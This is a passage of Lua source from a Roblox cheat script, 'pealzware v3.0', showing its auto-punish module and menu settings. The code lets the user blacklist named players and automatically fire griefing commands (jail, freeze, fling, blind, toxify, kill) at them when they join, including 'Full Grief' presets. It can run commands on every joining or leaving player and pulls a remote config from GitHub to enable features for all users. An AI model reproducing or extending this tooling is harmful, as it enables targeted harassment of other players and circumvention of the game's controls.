        task.wait(2)
        for _, cd in ipairs(autoOnPlayerJoinCmds) do
            if cd.enabled then
                autoCmdSendTarget(cd.cmd, player.Name)
                task.wait(0.5)
            end
        end
    end)
end

-- ─── Auto on-player-leave ─────────────────────────────────────────────
local function runAutoOnPlayerLeaveCmds(player)
    if not autoOnPlayerLeaveEnabled then return end
    task.spawn(function()
        for _, cd in ipairs(autoOnPlayerLeaveCmds) do
            if cd.enabled then
                autoCmdSendTarget(cd.cmd, player.Name)
                task.wait(0.5)
            end
        end
    end)
end

-- ─── UI refresh helpers ───────────────────────────────────────────────
local function refreshBlacklistUI()
    local blcnt, blnames = 0, {}
    for _, bld in pairs(blacklistedPlayers) do
        blcnt = blcnt + 1; table.insert(blnames, bld.name)
    end
    table.sort(blnames, function(a, b) return a:lower() < b:lower() end)
    if blcnt == 0 then table.insert(blnames, "(empty)") end
    if BlacklistCountLabel  then BlacklistCountLabel:SetText("Blacklisted: " .. blcnt .. " player(s)") end
    if BlacklistViewDropdown then pcall(function() BlacklistViewDropdown:Refresh(blnames) end) end
end

local function refreshAutoSelfLabel()
    if not AutoSelfCmdCountLabel then return end
    local n = 0
    for _, c in ipairs(autoSelfJoinCmds) do if c.enabled then n = n + 1 end end
    AutoSelfCmdCountLabel:SetText(n .. " enabled")
end
local function refreshAutoJoinLabel()
    if not AutoJoinCmdCountLabel then return end
    local n = 0
    for _, c in ipairs(autoOnPlayerJoinCmds) do if c.enabled then n = n + 1 end end
    AutoJoinCmdCountLabel:SetText("Join commands: " .. #autoOnPlayerJoinCmds .. " total, " .. n .. " enabled")
end
local function refreshAutoLeaveLabel()
    if not AutoLeaveCmdCountLabel then return end
    local n = 0
    for _, c in ipairs(autoOnPlayerLeaveCmds) do if c.enabled then n = n + 1 end end
    AutoLeaveCmdCountLabel:SetText("Leave commands: " .. #autoOnPlayerLeaveCmds .. " total, " .. n .. " enabled")
end

-- ─── System init ──────────────────────────────────────────────────────
local function initAutoCmdSystem()
    for _, c in ipairs(autoCmdConnections) do pcall(function() c:Disconnect() end) end
    autoCmdConnections = {}
    table.insert(autoCmdConnections, Players.PlayerAdded:Connect(function(player)
        runBlacklistOnPlayer(player)
        runAutoOnPlayerJoinCmds(player)
    end))
    table.insert(autoCmdConnections, Players.PlayerRemoving:Connect(function(player)
        runAutoOnPlayerLeaveCmds(player)
    end))
end
initAutoCmdSystem()
runAutoSelfJoinCmds()

-- ─── UI ──────────────────────────────────────────────────────────────
local AutoCmdBlacklistGroup = Tabs.AutoCmds:CreateModule({Name = 'Blacklist Manager'})

AutoCmdBlacklistGroup:CreateToggle({
    Name = 'Enable Blacklist',
    Default = false,
    Tooltip = 'Auto-execute actions on blacklisted players when they join'
}):OnChanged(function(val)
    blacklistEnabled = val
    Library:Notify(val and "Blacklist ACTIVE" or "Blacklist disabled", 2)
end)

BlacklistPlayerNameInput = AutoCmdBlacklistGroup:CreateInput({
    Name = 'Add Username',
    Default = '',
    Placeholder = 'Enter player username',
    Tooltip = 'Username to add to blacklist'
})

BlacklistActionSelect = AutoCmdBlacklistGroup:CreateDropdown({
    Name = 'Action Preset',
    Options = allAutoActions,
    Default = 'jail',
    Tooltip = 'Primary action to run on this player'
})

BlacklistExtraInput = AutoCmdBlacklistGroup:CreateInput({
    Name = 'Extra Commands',
    Default = '',
    Placeholder = 'Comma-separated extra cmds',
    Tooltip = 'Additional commands (comma-separated, e.g. freeze,blind)'
})

BlacklistJoinDelaySlider = AutoCmdBlacklistGroup:CreateSlider({
    Name = 'Join Delay (s)',
    Default = 2, Min = 0, Max = 15, Increment = 1,
    Tooltip = 'Seconds to wait after the player joins before acting'
})
BlacklistJoinDelaySlider:OnChanged(function(val) blacklistJoinDelay = val end)

BlacklistRepeatSlider = AutoCmdBlacklistGroup:CreateSlider({
    Name = 'Repeat Count',
    Default = 1, Min = 1, Max = 5, Increment = 1,
    Tooltip = 'How many times to loop through all actions (5s gap)'
})

AutoCmdBlacklistGroup:CreateButton({
    Name = 'Add to Blacklist',
    Function = function()
        local name = BlacklistPlayerNameInput and BlacklistPlayerNameInput.Value or ''
        if name == "" then Library:Notify("Enter a username first", 3); return end
        local acts = {BlacklistActionSelect and BlacklistActionSelect.Value or 'jail'}
        local extra = BlacklistExtraInput and BlacklistExtraInput.Value or ''
        if extra ~= "" then
            for _, ec in ipairs(string.split(extra, ",")) do
                local t = ec:gsub("^%s+",""):gsub("%s+$","")
                if t ~= "" then table.insert(acts, t) end
            end
        end
        blacklistedPlayers[name:lower()] = {
            name = name, enabled = true, actions = acts,
            joinDelay   = BlacklistJoinDelaySlider and BlacklistJoinDelaySlider.Value or 2,
            repeatCount = BlacklistRepeatSlider    and BlacklistRepeatSlider.Value    or 1,
            repeatDelay = 5
        }
        Library:Notify("Blacklisted: " .. name, 4)
        refreshBlacklistUI()
    end
})

AutoCmdBlacklistGroup:CreateButton({
    Name = 'Run on Selected',
    Function = function()
        local name = BlacklistViewDropdown and BlacklistViewDropdown.Value or ''
        if name == "" or name == "(empty)" then Library:Notify("Nothing selected", 2); return end
        for _, onlinePlr in ipairs(Players:GetPlayers()) do
            if onlinePlr.Name:lower() == name:lower() then
                runBlacklistOnPlayer(onlinePlr)
                Library:Notify("Triggered blacklist on " .. onlinePlr.Name, 3); return
            end
        end
        Library:Notify(name .. " is not in this server", 3)
    end
})

AutoCmdBlacklistGroup:CreateButton({
    Name = 'Toggle Selected',
    Function = function()
        local name = BlacklistViewDropdown and BlacklistViewDropdown.Value or ''
        if name == "" or name == "(empty)" then Library:Notify("Nothing selected", 2); return end
        local k = name:lower()
        if blacklistedPlayers[k] then
            blacklistedPlayers[k].enabled = not blacklistedPlayers[k].enabled
            Library:Notify(name .. " -> " .. (blacklistedPlayers[k].enabled and "ENABLED" or "DISABLED"), 3)
        end
    end
})

AutoCmdBlacklistGroup:CreateButton({
    Name = 'Remove Selected',
    Function = function()
        local name = BlacklistViewDropdown and BlacklistViewDropdown.Value or ''
        if name == "" or name == "(empty)" then Library:Notify("Nothing selected", 2); return end
        blacklistedPlayers[name:lower()] = nil
        Library:Notify("Removed " .. name .. " from blacklist", 3)
        refreshBlacklistUI()
    end
})

AutoCmdBlacklistGroup:CreateButton({
    Name = 'Clear Blacklist',
    Function = function()
        blacklistedPlayers = {}
        Library:Notify("Blacklist cleared", 3)
        refreshBlacklistUI()
    end
})

BlacklistCountLabel = AutoCmdBlacklistGroup:CreateLabel({Text = 'Blacklisted: 0 player(s)'})

BlacklistViewDropdown = AutoCmdBlacklistGroup:CreateDropdown({
    Name = 'Blacklisted Players',
    Options = {"(empty)"},
    Default = '(empty)',
    Tooltip = 'Select a player to manage'
})

-- Player Join Commands
local AutoOnJoinGroup = Tabs.AutoCmds:CreateModule({Name = 'Player Join'})

AutoOnJoinGroup:CreateToggle({
    Name = 'Enable Join Commands',
    Default = false,
    Tooltip = 'Execute commands on every player that joins'
}):OnChanged(function(val)
    autoOnPlayerJoinEnabled = val
    Library:Notify(val and "On-Join commands active" or "On-Join commands disabled", 2)
end)

AutoJoinCmdTextInput = AutoOnJoinGroup:CreateInput({
    Name = 'Command',
    Default = '',
    Placeholder = 'Enter command (no semicolon)',
    Tooltip = 'Command to run on joining player'
})

AutoJoinPresetDropdown = AutoOnJoinGroup:CreateDropdown({
    Name = 'Preset',
    Options = allAutoActions,
    Default = 'jail',
    Tooltip = 'Used if command input is empty'
})

AutoOnJoinGroup:CreateButton({
    Name = 'Add Command',
    Function = function()
        local cmd = (AutoJoinCmdTextInput and AutoJoinCmdTextInput.Value ~= "") and AutoJoinCmdTextInput.Value or (AutoJoinPresetDropdown and AutoJoinPresetDropdown.Value or 'jail')
        if cmd == "" then Library:Notify("Enter a command first", 3); return end
        table.insert(autoOnPlayerJoinCmds, {cmd = cmd, enabled = true})
        Library:Notify("Join command added: ;" .. cmd, 3)
        refreshAutoJoinLabel()
    end
})

AutoOnJoinGroup:CreateButton({
    Name = 'Run on All Players',
    Function = function()
        if #autoOnPlayerJoinCmds == 0 then Library:Notify("No join commands set", 3); return end
        task.spawn(function()
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= plr then
                    for _, cd in ipairs(autoOnPlayerJoinCmds) do
                        if cd.enabled then autoCmdSendTarget(cd.cmd, player.Name); task.wait(0.5) end
                    end
                end
            end
            Library:Notify("Ran join commands on all players", 3)
        end)
    end
})

AutoOnJoinGroup:CreateButton({
    Name = 'Clear All',
    Function = function()
        autoOnPlayerJoinCmds = {}
        Library:Notify("Join commands cleared", 3)
        refreshAutoJoinLabel()
    end
})

AutoJoinCmdCountLabel = AutoOnJoinGroup:CreateLabel({Text = 'Join commands: 0 total, 0 enabled'})

-- Self Commands (run on own join)
local AutoSelfGroup = Tabs.AutoCmds:CreateModule({Name = 'Self Commands'})

AutoSelfGroup:CreateToggle({
    Name = 'Enable Self Commands',
    Default = false,
    Tooltip = 'Auto-run commands on yourself when you join a server'
}):OnChanged(function(val)
    autoSelfJoinEnabled = val
    Library:Notify(val and "Self commands active" or "Self commands disabled", 2)
end)

AutoSelfCmdTextInput = AutoSelfGroup:CreateInput({
    Name = 'Command',
    Default = '',
    Placeholder = 'Enter command (no semicolon)',
    Tooltip = 'Command to run on yourself when joining'
})

AutoSelfPresetDropdown = AutoSelfGroup:CreateDropdown({
    Name = 'Preset',
    Options = allAutoActions,
    Default = 'fly',
    Tooltip = 'Used if command input is empty'
})

AutoSelfDelaySlider = AutoSelfGroup:CreateSlider({
    Name = 'Command Delay (s)',
    Default = 1, Min = 0, Max = 10, Increment = 1,
    Tooltip = 'Delay between self commands'
})

AutoSelfGroup:CreateButton({
    Name = 'Add Self Command',
    Function = function()
        local cmd = (AutoSelfCmdTextInput and AutoSelfCmdTextInput.Value ~= "") and AutoSelfCmdTextInput.Value or (AutoSelfPresetDropdown and AutoSelfPresetDropdown.Value or 'fly')
        if cmd == "" then Library:Notify("Enter a command first", 3); return end
        local delay = AutoSelfDelaySlider and AutoSelfDelaySlider.Value or 0.5
        table.insert(autoSelfJoinCmds, {cmd = cmd, enabled = true, delay = delay})
        Library:Notify("Self command added: ;" .. cmd, 3)
        refreshAutoSelfLabel()
    end
})

AutoSelfGroup:CreateButton({
    Name = 'Run Now',
    Function = function()
        task.spawn(function()
            for _, cd in ipairs(autoSelfJoinCmds) do
                if cd.enabled then autoCmdSend(cd.cmd); task.wait(cd.delay or 0.5) end
            end
        end)
    end
})

AutoSelfGroup:CreateButton({
    Name = 'Clear Self Commands',
    Function = function()
        autoSelfJoinCmds = {}
        Library:Notify("Self commands cleared", 3)
        refreshAutoSelfLabel()
    end
})

AutoSelfCmdCountLabel = AutoSelfGroup:CreateLabel({Text = '0 enabled'})

-- Player Leave Commands
local AutoOnLeaveGroup = Tabs.AutoCmds:CreateModule({Name = 'Player Leave'})

AutoOnLeaveGroup:CreateToggle({
    Name = 'Enable Leave Commands',
    Default = false,
    Tooltip = 'Execute commands when a player leaves'
}):OnChanged(function(val)
    autoOnPlayerLeaveEnabled = val
    Library:Notify(val and "On-Leave commands active" or "On-Leave commands disabled", 2)
end)

AutoLeaveCmdTextInput = AutoOnLeaveGroup:CreateInput({
    Name = 'Command',
    Default = '',
    Placeholder = 'Enter command (no semicolon)',
    Tooltip = 'Command to run on leaving player'
})

AutoLeavePresetDropdown = AutoOnLeaveGroup:CreateDropdown({
    Name = 'Preset',
    Options = allAutoActions,
    Default = 'kill',
    Tooltip = 'Used if command input is empty'
})

AutoOnLeaveGroup:CreateButton({
    Name = 'Add Command',
    Function = function()
        local cmd = (AutoLeaveCmdTextInput and AutoLeaveCmdTextInput.Value ~= "") and AutoLeaveCmdTextInput.Value or (AutoLeavePresetDropdown and AutoLeavePresetDropdown.Value or 'kill')
        if cmd == "" then Library:Notify("Enter a command first", 3); return end
        table.insert(autoOnPlayerLeaveCmds, {cmd = cmd, enabled = true})
        Library:Notify("Leave command added: ;" .. cmd, 3)
        refreshAutoLeaveLabel()
    end
})

AutoOnLeaveGroup:CreateButton({
    Name = 'Clear All Leave Commands',
    Function = function()
        autoOnPlayerLeaveCmds = {}
        Library:Notify("Leave commands cleared", 3)
        refreshAutoLeaveLabel()
    end
})

AutoLeaveCmdCountLabel = AutoOnLeaveGroup:CreateLabel({Text = 'Leave commands: 0 total, 0 enabled'})

-- Quick Blacklist Presets
local QuickBlacklistGroup = Tabs.AutoCmds:CreateModule({Name = 'Blacklist Presets'})

QuickBlacklistNameInput = QuickBlacklistGroup:CreateInput({
    Name = 'Username',
    Default = '',
    Placeholder = 'Enter player username',
    Tooltip = 'Player to quick-blacklist'
})

local function quickBlacklist(actions, repeatCount, label)
    local name = QuickBlacklistNameInput and QuickBlacklistNameInput.Value or ''
    if name == "" then Library:Notify("Enter a username first", 3); return end
    blacklistedPlayers[name:lower()] = {
        name = name, enabled = true, actions = actions,
        joinDelay = blacklistJoinDelay, repeatCount = repeatCount or 1, repeatDelay = 5
    }
    Library:Notify("Blacklisted: " .. name .. "  |  " .. label, 4)
    refreshBlacklistUI()
end

QuickBlacklistGroup:CreateButton({
    Name = 'Grief  (Jail + Freeze + Glitch)',
    Function = function() quickBlacklist({"jail","freeze","glitch"}, 1, "Grief Pack x1") end
})
QuickBlacklistGroup:CreateButton({
    Name = 'Fling  (Kill + Fling + Glitch)',
    Function = function() quickBlacklist({"kill","fling","glitch"}, 2, "Fling Pack x2") end
})
QuickBlacklistGroup:CreateButton({
    Name = 'Silence  (Mute + Jail + Blind)',
    Function = function() quickBlacklist({"mute","jail","blind"}, 1, "Silence Pack x1") end
})
QuickBlacklistGroup:CreateButton({
    Name = 'Full Grief  (All actions x3)',
    Function = function() quickBlacklist({"jail","freeze","glitch","blind","toxify","mute","fling"}, 3, "Full Grief x3") end
})

-- Cleanup on unload
Library:OnUnload(function()
    for _, c in ipairs(autoCmdConnections) do pcall(function() c:Disconnect() end) end
    autoCmdConnections = {}
end)
end -- /══ Auto Commands (Punish Tab) ══

do -- ══ Menu Settings ══
 MenuGroup = Tabs.Settings:CreateModule({Name = 'Menu'})
MenuGroup:CreateButton({
    Name = 'Unload Script',
    Function = function() Library:Unload() end
})

local _rainbowToggle = MenuGroup:CreateToggle({
    Name = 'Rainbow Mode',
    Default = false,
    Tooltip = 'Cycles the GUI accent colour through the rainbow'
})
_rainbowToggle:OnChanged(function(enabled)
    pcall(function()
        if enabled then
            if not Library.GUIColor.Rainbow then
                Library.GUIColor.Rainbow = true
                table.insert(Library.RainbowTable, Library.GUIColor)
            end
        else
            Library.GUIColor.Rainbow = false
            local idx = table.find(Library.RainbowTable, Library.GUIColor)
            if idx then table.remove(Library.RainbowTable, idx) end
        end
    end)
end)

MenuGroup:CreateLabel({Text = 'Menu Keybind: Left Ctrl'})

pcall(function()
    MenuKeybind = MenuGroup:CreateKeyPicker({
        Default = 'End',
        NoUI = false,
        Name = 'Menu Keybind'
    })
end)

 MenuSize = MenuGroup:CreateSlider({
    Name = 'Menu Size',
    Default = 10,
    Min = 5,
    Max = 15,
    Increment = 1,
    Compact = false,
    Tooltip = 'Change menu size'
})

function divudim2(udim2,num)
    return UDim2.new(udim2.X.Scale/num,udim2.X.Offset/num,udim2.Y.Scale/num,udim2.Y.Offset/num)
end

function muludim2(udim2,num)
    return UDim2.new(udim2.X.Scale*num,udim2.X.Offset*num,udim2.Y.Scale*num,udim2.Y.Offset*num)
end

-- Capture PealzwareUI's auto-computed base scale (set by BuildRoot based on screen res).
-- We MUST treat this as the baseline — overwriting it with an absolute value (e.g. 1.0)
-- makes the UI overflow off-screen on anything smaller than a 1920px display.
local _pealzBaseScale = pcall(function() return Library.Scale.Scale end) and Library.Scale.Scale or 1.0

local function applyMenuSize(scaleValue)
    -- Apply MenuSize (5–15, default 10) as a MULTIPLIER on top of PealzwareUI's own scale.
    -- At default (10 → ×1.0) this is a no-op. At 15 → ×1.5 it enlarges; at 5 → ×0.5 shrinks.
    local _multiplier = (tonumber(scaleValue) or 10) / 10
    pcall(function()
        if Library and Library.Scale then
            Library.Scale.Scale = _pealzBaseScale * _multiplier
        end
    end)
end

MenuSize:OnChanged(function()
    pcall(function()
        applyMenuSize(MenuSize.Value)
    end)
end)
-- NOTE: do NOT call applyMenuSize on startup via task.defer — that was overriding
-- PealzwareUI's scale before the rest of the UI settled, pushing everything off-screen.

if MenuKeybind then
    Library.ToggleKeybind = MenuKeybind
    -- modern.lua reads Library.Keybind (table of key names) to toggle ClickGui visibility
    Library.Keybind = {'End'}
end

-- ── PealzFat Leaderboard Fix ─────────────────────────────────────────────────
-- Prevents the Roblox playerlist from breaking when Tab is pressed repeatedly.
-- Hooks Tab to toggle the list via StarterGui:SetCoreGuiEnabled instead of the
-- default binding, which would corrupt the leaderboard state on repeated presses.
local _pealzFatGroup = Tabs.Settings:CreateModule({Name = 'Fixes'})
local _pealzFatEnabled = true

local _pealzFatToggle = _pealzFatGroup:CreateToggle({
    Name  = 'Leaderboard Fix (PealzFat)',
    Default = true,
    Tooltip = 'Prevents the Tab leaderboard from breaking when opened/closed rapidly'
})

local _sg  = game:GetService("StarterGui")
local _uis = game:GetService("UserInputService")
local _pealzFatConn = nil

local function _connectPealzFat()
    if _pealzFatConn then return end
    _pealzFatConn = _uis.InputBegan:Connect(function(input, gameProcessed)
        if input.KeyCode == Enum.KeyCode.Tab then
            _pealzFatEnabled = not _pealzFatEnabled
            local s, err = pcall(function()
                _sg:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, _pealzFatEnabled)
            end)
            if not s then warn("[pealzware] PealzFat error: " .. tostring(err)) end
        end
    end)
end

local function _disconnectPealzFat()
    if _pealzFatConn then
        pcall(function() _pealzFatConn:Disconnect() end)
        _pealzFatConn = nil
    end
end

_pealzFatToggle:OnChanged(function(val)
    if val then
        _connectPealzFat()
    else
        _disconnectPealzFat()
        pcall(function() _sg:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true) end)
    end
end)

-- Enable on load (matches Default = true above)
_connectPealzFat()
-- ─────────────────────────────────────────────────────────────────────────────

Library:SetWatermarkVisibility(true)

 FrameTimer = tick()
 FrameCounter = 0
 FPS = 60
ping = 0
playerCount = #Players:GetPlayers()
local _wmRoleStr = isOwner and 'Owner' or isPremium and 'Premium' or 'Free'

Library:GiveSignal(RunService.Heartbeat:Connect(function(dt)
    FrameCounter = FrameCounter + 1

    if (tick() - FrameTimer) >= 1 then
        FPS = FrameCounter
        FrameTimer = tick()
        FrameCounter = 0
        pcall(function()
            ping = math.floor(plr:GetNetworkPing() * 1000)
        end)
        playerCount = #Players:GetPlayers()
        Library:SetWatermark(string.format(
            'pealzware v3.0 | %d fps | %d ms | %d players | %s',
            FPS, ping, playerCount, _wmRoleStr
        ))
    end
end))

_hubInitDone = false
local _origLibNotify = Library.Notify
Library.Notify = function(self, text, time)
    if not _hubInitDone then return end
    return _origLibNotify(self, text, time)
end
SaveManager:LoadAutoloadConfig()
applyMenuSize(MenuSize.Value)
pcall(function() PlayersESPToggle:SetValue(false) end)
pcall(function() BuildingsESPToggle:SetValue(false) end)
pcall(function() if ToolsESPToggle then ToolsESPToggle:SetValue(false) end end)
pcall(RemoveAllESP)
pcall(StopESPUpdateLoop)
_charStatsReady = true
_hubInitDone = true
Library.Notify = _origLibNotify

-- ══ Default Config Loader ════════════════════════════════════════════════════
-- Fetches defaultconfig.json from the pealzware repo and applies any enabled
-- toggles / slider values / dropdown selections.  Edit defaultconfig.json on
-- GitHub to control what's on for everyone who loads the TCO script.
task.spawn(function()
    pcall(function()
        local _dcUrl = "https://raw.githubusercontent.com/1AreYouMental110/pealzware/main/defaultconfig.json"
        local _dcRaw = game:HttpGet(_dcUrl, true)
        if not _dcRaw or _dcRaw == "" or _dcRaw:find("404") then return end
        local _dc = HttpService:JSONDecode(_dcRaw)
        if type(_dc) ~= "table" then return end

        -- Apply toggles
        if type(_dc.toggles) == "table" then
            for _name, _val in pairs(_dc.toggles) do
                pcall(function()
                    for _, mod in pairs(Library.Modules) do
                        if mod.Name == _name then
                            local _ctrl = mod.Options and mod.Options[_name]
                            if _ctrl and _ctrl.SetValue then
                                _ctrl:SetValue(_val == true)
                            elseif mod.SetValue then
                                mod:SetValue(_val == true)
                            end
                        end
                    end
                end)
            end
        end

        -- Apply sliders
        if type(_dc.sliders) == "table" then
            for _name, _val in pairs(_dc.sliders) do
                pcall(function()
                    for _, cat in pairs(Library.Categories) do
                        if cat.Options and cat.Options[_name] then
                            local _ctrl = cat.Options[_name]
                            if _ctrl and _ctrl.SetValue then _ctrl:SetValue(tonumber(_val)) end
                        end
                    end
                end)
            end
        end

        -- Apply GUI accent colour
        if type(_dc.gui) == "table" then
            pcall(function()
                if _dc.gui.accentHue then
                    Library.GUIColor.Hue = tonumber(_dc.gui.accentHue) or Library.GUIColor.Hue
                    Library.GUIColor.Sat = tonumber(_dc.gui.accentSat) or Library.GUIColor.Sat
                    Library.GUIColor.Value = tonumber(_dc.gui.accentVal) or Library.GUIColor.Value
                end
                if _dc.gui.rainbowEnabled then
                    -- Enable rainbow on the GUIColor slider (the actual mechanism in modern.lua)
                    if Library.GUIColor and not Library.GUIColor.Rainbow then
                        Library.GUIColor.Rainbow = true
                        table.insert(Library.RainbowTable, Library.GUIColor)
                    end
                end
                if _dc.gui.rainbowSpeed then
                    Library.RainbowSpeed.Value = tonumber(_dc.gui.rainbowSpeed) or 1
                end
            end)
        end
    end)
end)
-- ══ End Default Config Loader ════════════════════════════════════════════════

function SetupAutoRejoin()
    if autoRejoinConn then
        autoRejoinConn:Disconnect()
        autoRejoinConn = nil
    end
    if AutoRejoin.Value then
        autoRejoinConn = plr.OnTeleport:Connect(function(state)
            if state == Enum.TeleportState.Failed then
                TeleportService:Teleport(game.PlaceId)
            end
        end)
    end
end

AutoRejoin:OnChanged(function()
    SetupAutoRejoin()
end)

task.spawn(function()
    task.wait(2)
    SetupAutoRejoin()

    if ShowCredits.Value then
        Library:Notify('pealzware v3.0 Loaded!', 5)
        Library:Notify('Credits to pealz/pealzware and Soskoify!', 5) -- adding this to piss off pealz
        Library:Notify("Discord invite copied to clipboard! .gg/zSuZN5e6MZ", 8)
    end

    if isOwner then
        if plr.Character then
            Library:Notify("welcome back, fatty", 5)
        end
    end
end)

end -- menu settings
end
 success, err = pcall(main)
if not success then
    warn("[ROMAZHUB ERROR]: " .. tostring(err))
end
